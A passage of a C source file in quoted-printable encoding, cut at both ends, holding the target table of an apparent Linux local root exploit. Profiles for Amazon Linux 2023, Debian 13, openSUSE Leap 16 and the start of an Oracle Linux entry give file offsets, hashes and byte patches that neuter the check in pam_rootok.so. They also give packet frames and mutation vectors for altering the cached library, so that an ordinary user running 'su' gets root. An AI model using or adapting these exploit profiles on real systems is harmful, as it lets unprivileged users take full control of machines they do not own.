      0x9e, 0xa4, 0xb1, 0x50, 0x97, 0xf0, 0x17, 0x79, 0x83, 0x4b, 0x00, 0=
x68, 0x71, 0x37, 0xb8, 0x25, 
      0x36, 0xb0, 0x98, 0x83, 0x15, 0x18, 0xbe, 0xd4, 0xe4, 0x18, 0x17, 0=
x4f, 0xb1, 0x58, 0xe6, 0x08, 
      0x4f, 0xf9, 0x31, 0xb9, 0x92, 0x8a, 0xb0, 0xcb, 0x20, 0x60, 0x01, 0=
xe3, 0xb4, 0x36, 0xb9, 0x70, 
      0x0d, 0xbd, 0xc4, 0x93, 0x81, 0x1d, 0x0d, 0xcb, 0x64, 0x3f, 0xb0, 0=
x7e, 0x42, 0x4c, 0x87, 0xe4, 
      0x9b, 0x80, 0x2a, 0xbe, 0xd5, 0x0d, 0xa8, 0xb7, 0xf4, 0xa1, 0x0b, 0=
xad, 0xb1, 0x98, 0x55, 0x6d, 
      0x04, 0xb2
    },
  },
  [2] =3D {
    .profile_id =3D "amazonlinux2023-k618",
    .evidence_aliases =3D "al2023-kernel618-host-poc-uid1001",
    .kernel_releases =3D "6.18.36-69.138.amzn2023.x86_64",
    .distribution_id =3D "amzn",
    .distribution_version =3D "2023",
    .package_name =3D "pam",
    .package_versions =3D "1.5.1-8.amzn2023.0.8",
    .filesystem =3D "xfs",
    .lsm_constraint =3D "selinux:Permissive:unconfined_t",
    .target_path =3D "/usr/lib64/security/pam_rootok.so",
    .target_build_id =3D "be52b8d2a4f062d64af0fe700a3e0e4bd57af36a",
    .baseline_sha256 =3D "f567ab7e3244be2f5329a0e7c54a91550cc8f1336ddfa0a=
f8add26f094cfb75f",
    .mutated_sha256 =3D "f99e80d870e923410842fa359c7789f88e52b35e3cee011b=
2b1dc500d9b349ba",
    .backing_page_sha256 =3D "1ed62d531159149b1517a991aa8facba7629beda14a=
279c03a003d05e56abb9c",
    .package_query =3D "rpm",
    .execution_mode =3D "direct_unshare",
    .tc_mode =3D "embedded_u32",
    .consumer_mode =3D "pipe_su",
    .direct_io_mode =3D "xfs_direct",
    .recovery_mode =3D "eviction_then_inverse",
    .allowed_launchers =3D "",
    .automatic_launchers =3D "",
    .recovery_artifact =3D "amazonlinux2023-k618-recovery",
    .recovery_sha256 =3D "4e8217cbcd8d46bd8a2a227082780621ea683156aadc201=
4e15d618761734bd9",
    .distribution_suite =3D "",
    .allowed_supplementary_groups =3D "",
    .expected_uid =3D 1001, .expected_gid =3D 1001,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0755, .tc_frame_length =3D 96,
    .target_size =3D UINT64_C(0x3c78), .target_offset =3D UINT64_C(0x1492=
),
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 1,
    .guard_before =3D {
      0x64, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00, 0x48, 0x89, 0=
x44, 0x24, 0x08, 0x31, 0xc0
    }, .original_slice =3D {
      0xe8, 0xe9, 0xfc, 0xff, 0xff, 0x85, 0xc0, 0x74
    }, .desired_slice =3D {
      0x31, 0xc0, 0x90, 0x90, 0x90, 0x85, 0xc0, 0x74
    }, .guard_after =3D {
      0x4d, 0x41, 0xbc, 0x07, 0x00, 0x00, 0x00, 0x85, 0xdb, 0x74, 0x1d, 0=
x48, 0x8d, 0x0d, 0x5e, 0x0b
    },
    .success_message =3D "run command su",
    .tc_frame =3D {
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0=
x00, 0x08, 0x00, 0x45, 0x00, 
      0x02, 0x5c, 0x23, 0x45, 0x00, 0x00, 0x40, 0x32, 0x57, 0x29, 0x7f, 0=
x00, 0x00, 0x01, 0x7f, 0x00, 
      0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0x2e, 0=
xa7, 0x42, 0x69, 0x0e, 0xaf, 
      0x09, 0xe0, 0x27, 0x41, 0xc6, 0xde, 0x82, 0xfb, 0x2c, 0xe8, 0xe5, 0=
x93, 0x4e, 0x6c, 0x21, 0x58, 
      0x4f, 0x00, 0xa2, 0x7f, 0xac, 0x26, 0xd9, 0x33, 0x75, 0x74, 0x34, 0=
x7f, 0x21, 0x6d, 0x42, 0xf1, 
      0x5a, 0x08, 0x6a, 0xbb, 0xdc, 0xab, 0xab, 0x4e, 0xca, 0x59, 0x90, 0=
x91, 0x92, 0x93, 0x94, 0x95
    }, .mutation_vector =3D {
      0x9e, 0x9f, 0x73, 0x45, 0xfe, 0x84, 0xb9, 0xb6, 0xe8, 0x74, 0x99, 0=
xa8, 0x3c, 0x52, 0x1c, 0x82, 
      0xb4, 0xf2, 0x14, 0x5a, 0x5d, 0x3a, 0xe4, 0x12, 0xe5, 0xbd, 0xc6, 0=
xa0, 0xdc, 0xf0, 0x52, 0xd5, 
      0xbf, 0x0f, 0x4b, 0x72, 0x9d, 0x90, 0x24, 0x83, 0xfa, 0xce, 0xb6, 0=
x96, 0x1d, 0xc4, 0xf8, 0x02, 
      0x71, 0x8e, 0xbc, 0x3b, 0x5d, 0x92, 0x87, 0xf2, 0xa5, 0xf3, 0x06, 0=
x91, 0x0e, 0x6e, 0xa0, 0x21, 
      0x5f, 0xf2, 0xc9, 0xc8, 0xd8, 0xee, 0x9e, 0x7f, 0x91, 0x30, 0x34, 0=
x6f, 0xd8, 0x79, 0xae, 0xe4, 
      0x5a, 0xd9, 0x28, 0x52, 0x08, 0xa8, 0x9a, 0x41, 0x43, 0x91, 0x48, 0=
x60, 0xdd, 0xcf, 0x3d, 0x58, 
      0x37, 0x75, 0x0f, 0x7c, 0x20, 0x4c, 0x5f, 0x2e, 0x81, 0x02, 0x95, 0=
x5d, 0xd1, 0xda, 0x9a, 0x80, 
      0x2b, 0x48, 0x2c, 0xb0, 0x83, 0xdf, 0xd0, 0x4c, 0xee, 0xeb, 0x3d, 0=
xd8, 0xcc, 0x80, 0xae, 0x66, 
      0xe7, 0xf4, 0xe1, 0xa2, 0xfd, 0x5e, 0x77, 0x11, 0x8e, 0x85, 0xda, 0=
x60, 0xef, 0xcc, 0xbd, 0x21, 
      0x4d, 0x5a, 0xd8, 0x49, 0xbb, 0x94, 0x29, 0xee, 0xb7, 0x14, 0x2e, 0=
x25, 0x17, 0x2b, 0x91, 0x02, 
      0x5d, 0x7d, 0x47, 0xe3, 0xc9, 0xcb, 0x22, 0xec, 0xc3, 0x29, 0x3e, 0=
x50, 0xc7, 0x66, 0x97, 0xdf, 
      0xdb, 0x43, 0xa4, 0xac, 0x74, 0x5a, 0x50, 0xad, 0x2d, 0x6e, 0xf9, 0=
xe6, 0x6a, 0x67, 0x1f, 0xe8, 
      0x94, 0xfe, 0xa4, 0x1a, 0x37, 0x59, 0x47, 0x3a, 0x2d, 0xe1, 0xca, 0=
x68, 0x4f, 0x73, 0x79, 0x0b, 
      0x16, 0x72, 0xda, 0xe4, 0x3c, 0x87, 0xf2, 0x6e, 0x45, 0xc2, 0xf9, 0=
x91, 0x27, 0xe3, 0x10, 0x3c, 
      0x17, 0x09, 0x34, 0x5f, 0x12, 0x6a, 0xc5, 0x46, 0xe0, 0x38, 0xff, 0=
x5c, 0xbd, 0xed, 0x49, 0x10, 
      0xe7, 0x72, 0x65, 0x19, 0x19, 0x15, 0x92, 0x39, 0x3a, 0x30, 0x70, 0=
xc8, 0x21, 0x44, 0x83, 0x43, 
      0xde, 0x28, 0x11, 0xff, 0x77, 0x85, 0xd7, 0x80, 0xe2, 0xeb, 0x7f, 0=
x10, 0x2a, 0x66, 0xc0, 0x3d, 
      0x3d, 0x27, 0x22, 0xa7, 0xbb, 0xf1, 0x80, 0x82, 0x1e, 0xe7, 0x63, 0=
x3e, 0x89, 0x2d, 0x17, 0xcb, 
      0x31, 0x1c, 0x73, 0x7e, 0xf6, 0x35, 0x92, 0xd1, 0x25, 0x25, 0xc5, 0=
x28, 0x3d, 0x4d, 0x5d, 0xc9, 
      0xad, 0xfd, 0xa0, 0x90, 0x32, 0xc7, 0xc9, 0x86, 0x88, 0xf0, 0x3d, 0=
x66, 0xdb, 0x22, 0x4c, 0xd5, 
      0xcf, 0x35, 0xe4, 0x27, 0x5c, 0x54, 0x10, 0x9b, 0x19, 0x00, 0x7f, 0=
x14, 0x5b, 0x54, 0x8b, 0x57, 
      0x90, 0x4f, 0xab, 0xc4, 0xc7, 0x7f, 0x07, 0x5e, 0x5b, 0x30, 0xae, 0=
x0e, 0x40, 0xee, 0x7b, 0x44, 
      0x68, 0x95, 0x82, 0xdf, 0x24, 0x5c, 0xd4, 0x1b, 0x9a, 0xe7, 0x55, 0=
xd3, 0x26, 0xc2, 0x4d, 0x49, 
      0x92, 0x0b, 0x94, 0xc6, 0xc5, 0xae, 0x37, 0x41, 0x48, 0x8d, 0x9c, 0=
xc7, 0xfb, 0x56, 0x70, 0x68, 
      0x46, 0x7c, 0x6c, 0xb8, 0x5f, 0xb1, 0xe3, 0x39, 0xcd, 0x1a, 0x5e, 0=
x7f, 0x08, 0x94, 0x9c, 0x64, 
      0x1a, 0xaa, 0x8b, 0xe5, 0x5d, 0x6e, 0x0f, 0xd3, 0xfa, 0x63, 0xb9, 0=
xb8, 0xf3, 0x8b, 0x1f, 0x07, 
      0xeb, 0xe9, 0xf0, 0xed, 0x56, 0x8b, 0xcd, 0x32, 0x77, 0xda, 0xc5, 0=
x6f, 0x73, 0x24, 0x2d, 0x79, 
      0xaa, 0x76, 0x6d, 0x71, 0x0e, 0xf5, 0x1a, 0xa7, 0x40, 0xc5, 0xeb, 0=
xcf, 0x07, 0x8d, 0xf2, 0xe0, 
      0x2e, 0x62, 0x01, 0x46, 0xb0, 0xe5, 0xc1, 0x9b, 0x02, 0xb5, 0x6f, 0=
x9a, 0x80, 0xd4, 0x96, 0x67, 
      0x3f, 0xd9, 0xb0, 0x42, 0x3e, 0xa4, 0x27, 0xf2, 0xb0, 0xad, 0xad, 0=
x57, 0x38, 0xae, 0x4c, 0xd9, 
      0xd4, 0x27, 0x69, 0x8a, 0xb9, 0xbd, 0xa5, 0x78, 0x39, 0x30, 0x10, 0=
x1e, 0xf9, 0x27, 0x96, 0xf8, 
      0xb4, 0x0e, 0xf3, 0x6f, 0x8f, 0x50, 0xbc, 0xa5, 0x84, 0x34, 0xcc, 0=
x46, 0x0a, 0x9b, 0xa0, 0x61, 
      0x8b, 0xa9
    },
  },
  [3] =3D {
    .profile_id =3D "debian13",
    .evidence_aliases =3D "debian13-host-poc",
    /* Post-recovery audit extension: the recovered ELF listed 6.12.95 on=
ly. */
    .kernel_releases =3D "6.12.95+deb13-amd64,6.12.96+deb13-amd64",
    .distribution_id =3D "debian",
    .distribution_version =3D "13",
    .package_name =3D "libpam-modules",
    .package_versions =3D "1.7.0-5",
    .filesystem =3D "ext4",
    .lsm_constraint =3D "none",
    .target_path =3D "/usr/lib/x86_64-linux-gnu/security/pam_rootok.so",
    .target_build_id =3D "50963742d238fc7120cce3fa7fc52892b305908c",
    .baseline_sha256 =3D "75a9ee8d326025b66f5a2a40c556daf9fcd0ac47ddcecf7=
1d6e00a7ccdb032e6",
    .mutated_sha256 =3D "c285d6ee90ccda4191259da31f89c6c746181488df6b632d=
a397819788c5cbce",
    .backing_page_sha256 =3D "8792706ea73af92a3fa70025b39a7b1ac3f9e0666e3=
46aee97bcf57000fb8ea9",
    .package_query =3D "dpkg",
    .execution_mode =3D "direct_unshare",
    .tc_mode =3D "matchall_pedit",
    .consumer_mode =3D "pipe_su",
    .direct_io_mode =3D "ext4_direct",
    .recovery_mode =3D "eviction_only",
    .allowed_launchers =3D "",
    .automatic_launchers =3D "",
    .recovery_artifact =3D "debian13-recovery",
    .recovery_sha256 =3D "319eeeacff639a2a3b16a34e57e09a83ebc1dfabfc63683=
85011d608c09afe09",
    .distribution_suite =3D "trixie",
    .allowed_supplementary_groups =3D "",
    .expected_uid =3D 1000, .expected_gid =3D 1000,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0644, .tc_frame_length =3D 96,
    .target_size =3D UINT64_C(0x3800), .target_offset =3D UINT64_C(0x508)=
,
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 1,
    .guard_before =3D {
      0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xbb, 0x00, 0x00, 0=
x00, 0x12, 0x00, 0x0c, 0x00
    }, .original_slice =3D {
      0x50, 0x13, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    }, .desired_slice =3D {
      0x10, 0x15, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    }, .guard_after =3D {
      0xbd, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5f, 0x5f, 0=
x67, 0x6d, 0x6f, 0x6e, 0x5f
    },
    .success_message =3D "run command su",
    .tc_frame =3D {
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0=
x00, 0x08, 0x00, 0x45, 0x00, 
      0x02, 0x5c, 0x23, 0x45, 0x00, 0x00, 0x40, 0x32, 0x57, 0x29, 0x7f, 0=
x00, 0x00, 0x01, 0x7f, 0x00, 
      0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0x16, 0=
x24, 0x53, 0x28, 0xd9, 0x68, 
      0x7c, 0x22, 0xc7, 0x4e, 0x37, 0x40, 0x29, 0x34, 0x6c, 0x0f, 0xc1, 0=
xfe, 0x0b, 0xc6, 0xed, 0x14, 
      0xaf, 0xf7, 0xea, 0x54, 0x88, 0x43, 0x58, 0x9c, 0x16, 0xa9, 0x77, 0=
x5d, 0x6f, 0xc0, 0xee, 0xf7, 
      0xef, 0x75, 0xb4, 0x4c, 0x0b, 0x87, 0x2c, 0x92, 0x0f, 0x85, 0x90, 0=
x91, 0x92, 0x93, 0x94, 0x95
    }, .mutation_vector =3D {
      0x9e, 0x9f, 0x05, 0xb1, 0xc3, 0xa1, 0xad, 0xa1, 0xfa, 0xa1, 0xf1, 0=
xdd, 0xb1, 0x04, 0xda, 0xb1, 
      0xdf, 0x8d, 0x35, 0x5b, 0xe2, 0xb0, 0x67, 0xe7, 0xf1, 0x58, 0x81, 0=
x59, 0x05, 0x32, 0xb3, 0x45, 
      0xe7, 0x7c, 0x2d, 0x60, 0x4c, 0x38, 0x4f, 0x8c, 0x81, 0x40, 0x85, 0=
x3e, 0xe5, 0xac, 0xb8, 0x32, 
      0x99, 0xad, 0x55, 0x44, 0x14, 0x3d, 0x05, 0x6e, 0xd0, 0x54, 0xbb, 0=
x5d, 0xe6, 0x5e, 0x67, 0x08, 
      0x0a, 0xd2, 0x7a, 0x3e, 0xae, 0x26, 0x84, 0xb3, 0x2f, 0xee, 0x48, 0=
x7d, 0x33, 0xf7, 0x0e, 0x2f, 
      0xa8, 0xf7, 0xb4, 0xe4, 0xe5, 0xa3, 0x79, 0x92, 0x15, 0x4a, 0xf4, 0=
x1a, 0xbb, 0x3a, 0xb9, 0x9b, 
      0x5e, 0x97, 0x5d, 0xbe, 0xbc, 0x47, 0xf4, 0xaa, 0xdf, 0x3d, 0x2e, 0=
x8f, 0x40, 0x65, 0x9d, 0x3d, 
      0x5a, 0xc6, 0xfe, 0x7b, 0x10, 0x3f, 0xc1, 0x8e, 0xd3, 0xb7, 0x87, 0=
x2e, 0x69, 0xdb, 0x17, 0x67, 
      0x81, 0x7b, 0xed, 0x94, 0x3a, 0xd0, 0xae, 0x10, 0xd0, 0x2c, 0x27, 0=
xc9, 0x33, 0xae, 0x8d, 0xa6, 
      0xad, 0x9f, 0xb5, 0x94, 0xea, 0x0f, 0xf5, 0x3a, 0x28, 0x10, 0x23, 0=
x39, 0x0f, 0xf6, 0x85, 0x61, 
      0xa3, 0x33, 0xa9, 0x61, 0x3c, 0x36, 0x28, 0x60, 0xdc, 0x30, 0xa3, 0=
x69, 0x77, 0xe7, 0x90, 0x4f, 
      0x7c, 0xad, 0x1e, 0x2b, 0x5f, 0xdb, 0xea, 0x11, 0xd3, 0x39, 0x2b, 0=
x72, 0x27, 0xa1, 0x04, 0x98, 
      0xaa, 0x93, 0xf7, 0xb7, 0x5b, 0x88, 0x33, 0x16, 0xff, 0x0f, 0xd4, 0=
x80, 0x4c, 0xa1, 0x1f, 0x05, 
      0x20, 0x7f, 0xd8, 0xfe, 0xe9, 0xf4, 0x28, 0xb3, 0x9f, 0xb0, 0x9a, 0=
x25, 0xb0, 0xf3, 0x1d, 0x89, 
      0xe6, 0x20, 0x9e, 0x1d, 0x3e, 0xbe, 0xb0, 0xa4, 0x64, 0xe5, 0xe6, 0=
x6f, 0xd2, 0x8f, 0x9a, 0x7f, 
      0xda, 0xae, 0x0e, 0x1f, 0x27, 0x73, 0x33, 0xda, 0x32, 0x77, 0xdb, 0=
xe9, 0xfa, 0x4e, 0x2e, 0x0c, 
      0xd4, 0x82, 0x56, 0x6a, 0xd2, 0x01, 0xa9, 0xab, 0x27, 0xa0, 0x1c, 0=
x0a, 0x7c, 0xa8, 0x1a, 0x14, 
      0x7a, 0x82, 0xd2, 0xb6, 0x01, 0x9b, 0x2d, 0x5d, 0x2e, 0xff, 0x2d, 0=
x7d, 0x97, 0x2e, 0x9c, 0xc6, 
      0xf2, 0x1d, 0xc3, 0xcf, 0x25, 0x36, 0xfa, 0xdf, 0x5d, 0xe5, 0xfe, 0=
xe7, 0x2b, 0x61, 0xa6, 0xae, 
      0x1c, 0xbc, 0xe8, 0xd8, 0xae, 0xd1, 0x04, 0xf2, 0x81, 0x50, 0x8f, 0=
xf8, 0xa3, 0x5c, 0xa7, 0xb8, 
      0x21, 0x2e, 0xac, 0xca, 0xa0, 0xa9, 0xda, 0x15, 0x2a, 0x9d, 0x9a, 0=
x03, 0x8d, 0xcb, 0x12, 0xbe, 
      0xda, 0x9d, 0x1f, 0x7a, 0xe2, 0x5c, 0xdc, 0x72, 0x11, 0x52, 0x18, 0=
xb0, 0x90, 0x44, 0x87, 0xf7, 
      0x39, 0x3c, 0x27, 0x61, 0x56, 0x92, 0x21, 0x7e, 0xd1, 0xe0, 0xea, 0=
xfd, 0x39, 0xbf, 0xd0, 0x9d, 
      0x47, 0x86, 0x47, 0x50, 0x25, 0x7d, 0x84, 0x15, 0x66, 0x1a, 0xbc, 0=
x4f, 0x3b, 0x5d, 0x80, 0x3b, 
      0x1e, 0x03, 0x77, 0xb2, 0x43, 0x06, 0x8b, 0x94, 0x16, 0x41, 0x39, 0=
x85, 0x73, 0xca, 0x19, 0xc3, 
      0x55, 0x1a, 0x6e, 0xa5, 0x50, 0xe8, 0x6d, 0x00, 0x8c, 0x35, 0xab, 0=
x8e, 0x23, 0x4d, 0x13, 0x25, 
      0xf3, 0x77, 0x01, 0xcb, 0x5c, 0x58, 0xd0, 0x7d, 0x07, 0x28, 0xa9, 0=
x45, 0xbc, 0x6d, 0x57, 0x16, 
      0xf3, 0xcc, 0x60, 0x3e, 0xe4, 0x13, 0x90, 0x30, 0x0a, 0xa6, 0xa2, 0=
xbd, 0xb7, 0x7d, 0x01, 0x1a, 
      0x63, 0x9f, 0x86, 0x23, 0xe8, 0xaf, 0x49, 0x33, 0xce, 0xf6, 0xd7, 0=
x36, 0x19, 0x79, 0xcb, 0x60, 
      0x37, 0xb4, 0x9f, 0xa7, 0x6b, 0xa5, 0x4b, 0x6b, 0xc4, 0x02, 0x89, 0=
x26, 0xc1, 0x40, 0xac, 0xdb, 
      0xcd, 0x63, 0x71, 0xa1, 0x4d, 0x45, 0x83, 0xa0, 0xbe, 0xbd, 0x9c, 0=
x23, 0x01, 0x64, 0xac, 0x80, 
      0x35, 0x3d, 0xd1, 0x37, 0x87, 0xfe, 0x1a, 0x8c, 0xad, 0x51, 0x7e, 0=
x10, 0xfb, 0xc8, 0xd1, 0xab, 
      0x4a, 0xb7
    },
  },
  [4] =3D {
    .profile_id =3D "opensuse-leap16",
    .evidence_aliases =3D "leap16-host-poc,opensuse-leap16-k612-36-btrfs-=
safe-validated",
    .kernel_releases =3D "6.12.0-160000.35-default,6.12.0-160000.36-defau=
lt",
    .distribution_id =3D "opensuse-leap",
    .distribution_version =3D "16.0",
    .package_name =3D "pam",
    .package_versions =3D "1.7.1-160000.4.1,1.7.1-160000.3.1,1.7.1-160000=
.5.1",
    .filesystem =3D "btrfs",
    .lsm_constraint =3D "selinux:Enforcing:unconfined_t",
    .target_path =3D "/usr/lib64/security/pam_rootok.so",
    .target_build_id =3D "702cd7ed7668a6977231deaf8dd830054122eca4",
    .baseline_sha256 =3D "406bdb2e691daab6c40c9b9b9731bdc8decc3472bf879c2=
007b7162ba2f48825",
    .mutated_sha256 =3D "adb9175fa8f170bbb6a753bf8808d2b12d2a3b965259e77e=
98dce9a33c3bf65c",
    .backing_page_sha256 =3D "eeeb1cd45e8d6ba94ceb685c03b06cf51ec790ec36c=
0a9cb261eee29fa6ddae0",
    .package_query =3D "rpm",
    .execution_mode =3D "direct_unshare",
    .tc_mode =3D "matchall_pedit",
    .consumer_mode =3D "pipe_su",
    .direct_io_mode =3D "btrfs_direct",
    .recovery_mode =3D "eviction_then_inverse",
    .allowed_launchers =3D "",
    .automatic_launchers =3D "",
    .recovery_artifact =3D "opensuse-leap16-recovery",
    .recovery_sha256 =3D "2e8d07ecc5dfec77b3c08f7befdb5d2f6824b07a4234b1c=
9e664953139881f94",
    .distribution_suite =3D "",
    .allowed_supplementary_groups =3D "",
    .expected_uid =3D 1000, .expected_gid =3D 1000,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0755, .tc_frame_length =3D 96,
    .target_size =3D UINT64_C(0x3870), .target_offset =3D UINT64_C(0x1517=
),
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 1,
    .guard_before =3D {
      0xec, 0x20, 0x48, 0x89, 0x7d, 0xe8, 0x89, 0x75, 0xe4, 0xc7, 0x45, 0=
xfc, 0x07, 0x00, 0x00, 0x00
    }, .original_slice =3D {
      0xe8, 0x44, 0xfb, 0xff, 0xff, 0x85, 0xc0, 0x75
    }, .desired_slice =3D {
      0x31, 0xc0, 0x90, 0x90, 0x90, 0x85, 0xc0, 0x75
    }, .guard_after =3D {
      0x19, 0xe8, 0x0f, 0xff, 0xff, 0xff, 0x85, 0xc0, 0x74, 0x09, 0xe8, 0=
x62, 0xfb, 0xff, 0xff, 0x85
    },
    .success_message =3D "run command su",
    .tc_frame =3D {
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0=
x00, 0x08, 0x00, 0x45, 0x00, 
      0x02, 0x5c, 0x23, 0x45, 0x00, 0x00, 0x40, 0x32, 0x57, 0x29, 0x7f, 0=
x00, 0x00, 0x01, 0x7f, 0x00, 
      0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0xa7, 0=
x4d, 0x3c, 0x91, 0xf2, 0xf1, 
      0x49, 0xc7, 0xeb, 0x24, 0x3b, 0x01, 0x07, 0x01, 0x6a, 0xab, 0x70, 0=
x94, 0x69, 0x4f, 0x52, 0xd6, 
      0x97, 0x55, 0xa1, 0xc1, 0xcd, 0xae, 0xa2, 0x43, 0x13, 0x51, 0x33, 0=
xbe, 0x32, 0x53, 0xc6, 0xac, 
      0xa6, 0x71, 0xc1, 0xdc, 0x7c, 0xab, 0xb2, 0xa4, 0xd6, 0xc0, 0x90, 0=
x91, 0x92, 0x93, 0x94, 0x95
    }, .mutation_vector =3D {
      0x9e, 0x9f, 0x79, 0x4b, 0xdc, 0x06, 0xeb, 0x62, 0xd1, 0xf0, 0x26, 0=
x62, 0x1a, 0x51, 0x66, 0x9b, 
      0x12, 0xe0, 0xa7, 0xa0, 0xb5, 0xd6, 0xf4, 0x0f, 0xe6, 0xe2, 0xad, 0=
x2e, 0xe3, 0x17, 0x2a, 0xe9, 
      0xfa, 0xe9, 0xb5, 0x5f, 0xd7, 0xc5, 0xd8, 0x74, 0xc2, 0x49, 0xc7, 0=
xf4, 0x03, 0x2f, 0xb2, 0x31, 
      0x56, 0x63, 0xc0, 0x08, 0xf5, 0xb0, 0x1e, 0xd2, 0xb6, 0x6b, 0x78, 0=
x8b, 0x20, 0xab, 0x9a, 0xc3, 
      0x0c, 0x84, 0x4b, 0x8c, 0x31, 0x6e, 0xb2, 0x83, 0x58, 0x94, 0xcf, 0=
x6a, 0xd5, 0x9b, 0x2d, 0xb9, 
      0x50, 0xbe, 0x11, 0x14, 0x01, 0x81, 0x5f, 0x70, 0xa3, 0x02, 0xa6, 0=
xb8, 0x97, 0xe0, 0x1a, 0x59, 
      0x02, 0x54, 0x29, 0x71, 0xa4, 0x22, 0x9c, 0x9c, 0x3b, 0x70, 0x4e, 0=
x6e, 0x0b, 0xc1, 0x4c, 0xf7, 
      0x13, 0xdd, 0x39, 0xfe, 0xad, 0x5f, 0xc2, 0x05, 0xe0, 0x5d, 0xea, 0=
x04, 0x3f, 0x42, 0x95, 0x69, 
      0xca, 0x59, 0x00, 0x66, 0x37, 0xf3, 0x7d, 0xd6, 0x23, 0x6d, 0x8e, 0=
x7d, 0xd1, 0x73, 0x02, 0x98, 
      0xcd, 0x98, 0x1a, 0xcf, 0xae, 0x3c, 0x71, 0x61, 0x85, 0xc2, 0xa1, 0=
xa1, 0x17, 0xf9, 0xb1, 0x66, 
      0xd5, 0x40, 0xba, 0xfc, 0x54, 0x31, 0xa8, 0x4e, 0x10, 0x62, 0x3f, 0=
xaf, 0xd7, 0x36, 0xad, 0xe8, 
      0x7c, 0xb5, 0x76, 0x4d, 0x55, 0xa7, 0xd6, 0x86, 0xca, 0x91, 0x77, 0=
xb7, 0x3d, 0x5d, 0x80, 0x47, 
      0x1f, 0x3c, 0x0b, 0xc4, 0x70, 0x5b, 0x47, 0xf1, 0x50, 0xb6, 0x74, 0=
x87, 0xd9, 0x78, 0x0c, 0x2e, 
      0x38, 0xa4, 0x61, 0x2a, 0x17, 0xba, 0xed, 0x89, 0xaa, 0x97, 0x0b, 0=
xb3, 0x7d, 0x28, 0x91, 0x8c, 
      0x93, 0x7a, 0x60, 0xf7, 0xf9, 0xb9, 0x92, 0x0f, 0x28, 0x57, 0xc1, 0=
x4d, 0x03, 0x98, 0x96, 0x73, 
      0xd2, 0x6c, 0x4a, 0x9b, 0xa6, 0xe3, 0x0c, 0x64, 0x58, 0x8e, 0x75, 0=
x86, 0x46, 0x9d, 0xd4, 0x57, 
      0x3a, 0x5b, 0x01, 0x95, 0x2b, 0x7f, 0xd2, 0xbb, 0x93, 0x62, 0x87, 0=
xf2, 0xcc, 0xda, 0xda, 0xad, 
      0x9a, 0x37, 0x4c, 0xdc, 0x5d, 0x4b, 0x07, 0x6a, 0xa3, 0x28, 0xeb, 0=
xae, 0x44, 0x87, 0x55, 0xf1, 
      0xd7, 0xa9, 0x6f, 0xb7, 0x14, 0x7f, 0x9f, 0xc4, 0x5e, 0x5e, 0xb2, 0=
x1a, 0xc4, 0xcb, 0x78, 0x03, 
      0x54, 0x25, 0x7a, 0x7f, 0xbb, 0x46, 0x87, 0x53, 0x6f, 0x71, 0x86, 0=
x3f, 0xb0, 0x90, 0xaf, 0x5a, 
      0xe3, 0x8e, 0xa7, 0xac, 0x61, 0xd9, 0x2c, 0x2d, 0x1d, 0xc6, 0x85, 0=
xd7, 0xbd, 0xae, 0xc0, 0xbd, 
      0x4a, 0x1e, 0x11, 0x2b, 0xbd, 0xfd, 0x30, 0x14, 0x57, 0xf9, 0xad, 0=
xea, 0x14, 0x98, 0x78, 0xa2, 
      0x2a, 0x8a, 0x90, 0x71, 0x0d, 0x83, 0x24, 0x45, 0x65, 0x93, 0xef, 0=
x84, 0xf5, 0x45, 0xe5, 0x43, 
      0xca, 0x3e, 0x76, 0x58, 0xf3, 0xb6, 0x30, 0xad, 0x28, 0x57, 0x5d, 0=
xdd, 0xdc, 0x05, 0xb4, 0x99, 
      0x11, 0xc6, 0x16, 0xc0, 0xc7, 0xec, 0x9f, 0x17, 0x1f, 0x24, 0x14, 0=
x58, 0xf9, 0x34, 0x01, 0x48, 
      0x5f, 0xa2, 0x47, 0x7d, 0xa0, 0x45, 0x4d, 0x62, 0x65, 0x70, 0x6d, 0=
xff, 0x16, 0xde, 0xab, 0xcb, 
      0xbf, 0xbc, 0x7a, 0x62, 0xd5, 0x73, 0xb3, 0x53, 0x63, 0x4b, 0x18, 0=
x20, 0xcd, 0x2d, 0xbf, 0x5c, 
      0xb4, 0x8a, 0xa3, 0x14, 0x3e, 0xd6, 0x91, 0x59, 0x74, 0xdc, 0x64, 0=
x58, 0xd9, 0xab, 0x2e, 0x5d, 
      0xf1, 0xfc, 0xa9, 0x91, 0xd0, 0xa5, 0xe0, 0x84, 0x3b, 0x6b, 0x3d, 0=
x76, 0x89, 0xe6, 0x81, 0x79, 
      0xfc, 0xfe, 0xc1, 0xab, 0xa5, 0xd0, 0xd4, 0x1c, 0x97, 0xf1, 0xcc, 0=
xd1, 0xdb, 0xb6, 0x97, 0xbc, 
      0x6a, 0xe6, 0x0f, 0x64, 0x5d, 0x56, 0xaf, 0x00, 0xe1, 0xd9, 0x63, 0=
x00, 0x96, 0xe2, 0xb3, 0xf8, 
      0x25, 0x9b, 0xf0, 0xd8, 0xa9, 0x37, 0xcd, 0x76, 0xaf, 0xad, 0x8a, 0=
x74, 0xd0, 0x93, 0x68, 0xdc, 
      0xc2, 0xe5
    },
  },
  [5] =3D {
    .profile_id =3D "oraclelinux102-uek8",
    .evidence_aliases =3D "oraclelinux102-uek8-host-poc,oraclelinux102-rh=
ck-k612-2117-safe-validated,oraclelinux102-uek8-k612-2049244-preflight",
